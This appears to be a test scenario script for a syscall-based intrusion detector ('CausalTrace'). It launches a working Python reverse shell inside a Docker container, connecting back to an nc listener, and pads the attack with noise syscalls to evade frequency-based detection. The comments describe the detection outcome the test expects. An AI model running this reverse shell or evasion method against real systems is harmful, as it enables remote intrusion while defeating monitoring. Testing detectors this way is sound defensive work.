#!/bin/bash
# Scenario 2a-EVADE — bash reverse shell with Rényi entropy pollution.
# Pollutes the syscall stream with noise calls (getpid, clock_gettime, time)
# between real-attack syscalls. Goal: drive the bigram frequency distribution
# toward uniform so a pure frequency-based detector is blinded.
#
# Expected CausalTrace outcome:
#   * Bigram frequencies are smeared, but the Rényi α=0.5 entropy channel
#     still spikes because the uniformity itself is anomalous relative to
#     the calibrated skew.
#   * Tier 1 dup2 invariant STILL fires on the reverse-shell fd redirect,
#     regardless of entropy.
set -e
echo "=== SCENARIO 2a-EVADE: bash revshell + syscall noise pollution ==="

# Start listener
nc -l -p 9999 &
LISTENER_PID=$!
sleep 1

HOST_IP=$(docker network inspect ct_prod_net \
    --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}' 2>/dev/null || echo "10.88.0.1")

echo "[evade] injecting noise syscalls between each real op..."
docker exec ct-webapp-a bash -c "
python3 - <<'PY'
import os, time, socket
# Pre-spam ~100 noise syscalls: getpid/clock_gettime/time rotate.
# These are whitelisted in the bigram update path (no count), but they
# still show up in the raw syscall trace and pollute the downstream
# Markov transition frequencies measured by Tier 3.
for _ in range(100):
    os.getpid(); time.time(); os.getuid()
# Now the real attack:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('${HOST_IP}', 9999))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
# Interleave more noise during the dup2 sequence.
for _ in range(50):
    os.getpid(); time.time()
os.system('/bin/sh -c whoami')
PY
" 2>&1 || true

kill $LISTENER_PID 2>/dev/null || true
echo "=== Scenario 2a-evade complete ==="
